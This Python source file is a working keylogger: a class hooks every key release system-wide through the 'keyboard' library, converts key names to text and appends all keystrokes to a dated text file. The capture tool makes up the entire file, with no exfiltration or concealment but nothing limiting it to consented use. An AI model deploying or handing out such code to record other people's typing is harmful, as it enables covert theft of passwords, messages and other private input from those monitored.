from typing import Any
import keyboard
import datetime
import os

class Keylogger:
    def __init__(self) -> None:
        self.log = ''
        self.date = datetime.datetime.today()
        self.date = self.date.strftime('%d-%m-%Y')

    def callback(self, event: Any) -> None:
        name: str = event.name
        if len(name) > 1:
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '\nENTER\n'
            elif name == 'decimal':
                name = '.'
            elif name == 'shift':
                pass
            else:
                name = name.replace(' ', '_')
                name = f'\n{name.upper()}\n'
        self.log += name
        self.write_log(self.log)
        self.log = ''

    def write_log(self, log: str) -> None:
        if os.path.exists(f'{self.date}.txt'):
            with open(f'{self.date}.txt', 'a') as file:
                file.write(log)
        else:
            with open(f'{self.date}.txt', 'w') as file:
                file.write(log)
                
    def read_log(self) -> str:
        with open(f'{self.date}.txt', 'r') as file:
            return file.read()

    def start(self) -> None:
        keyboard.on_release(callback=self.callback)
        keyboard.wait()


def main() -> None:
    keylogger = Keylogger()
    keylogger.start()


if __name__ == '__main__':
    main()
